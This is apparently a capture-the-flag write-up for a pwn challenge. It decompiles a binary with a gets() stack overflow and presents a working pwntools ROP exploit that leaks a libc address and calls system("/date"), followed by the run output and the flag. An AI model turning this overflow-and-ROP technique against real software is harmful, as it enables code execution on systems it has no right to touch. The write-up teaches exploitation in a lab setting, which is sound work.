# Writeup

We are given a binary to pwn.

```
[*] '/home/pctf23/chall6/execution'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Executing the binary we see that it executes normally and exits.

```
$ ./execution 
Welcome to the feedback submiter.
Tell us some review about our program: 
good
 ``` 
 ```
 ...
0x00000000004005b6  info
0x00000000004005c7  date
0x00000000004005d8  vuln
0x00000000004005fe  main
...
```

so we could see a vuln function which mostly would have the problem

Disassembling the main in ghidra

```

undefined8 main(void)

{
  puts("Welcome to the feedback submiter.");
  vuln();
  return 0;
}
```
Disassembling the info in ghidra
```
void info(void)

{
  puts("Why not try to execuate the date in the root");
  return;
}
```
So we need to execute the date command in the root folder.

Disassembling the vuln in ghidra
```
void vuln(void)

{
  char local_48 [64];
  
  puts("Tell us some review about our program: ");
  gets(local_48);
  return;
}
```

so here a gets function is used so trying to find the offset we get it to be 72

So as we are asked to execute the date fiel in the root folder 
Using a rop to build it 

Writing a script for ROP using pwn

```
#!/usr/bin/python3
from pwn import *

context.arch = "amd64"

offset = 72

elf = ELF("./execution")
p = elf.process()


rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['vuln'])
rop.call("puts", [ next(elf.search(b"/date\x00"))])
rop.call(elf.symbols['system'], [ next(elf.search(b"/date\x00"))])

log.info(p.recvuntil("\n"))
log.info(p.recvuntil("\n"))

payload = [
    b"A" * offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8,b"\x00"))
log.info(f"puts found at {hex(puts)}")

p.interactive()
```

So now executing the python script
```

$ python3 solve.py
[*] '/home/pctf23/chall6/execution'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/pctf23/chall6/execution': pid 19904
[*] Loaded 14 cached gadgets for './execution'
/home/pctf23/chall6/solve.py:18: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  log.info(p.recvuntil("\n"))
[*] Welcome to the feedback submiter.
[*] Tell us some review about our program: 
/home/pctf23/chall6/solve.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts = u64(p.recvuntil("\n").rstrip().ljust(8,b"\x00"))
[*] puts found at 0x7efd23a39ed0
[*] Switching to interactive mode
Tell us some review about our program: 
$ ls
/date
p_ctf{c8@ng3_0rd3r_0f_3x3ccut10n}
[*] Got EOF while reading in interactive`

```

Got the flag ```p_ctf{c8@ng3_0rd3r_0f_3x3ccut10n}```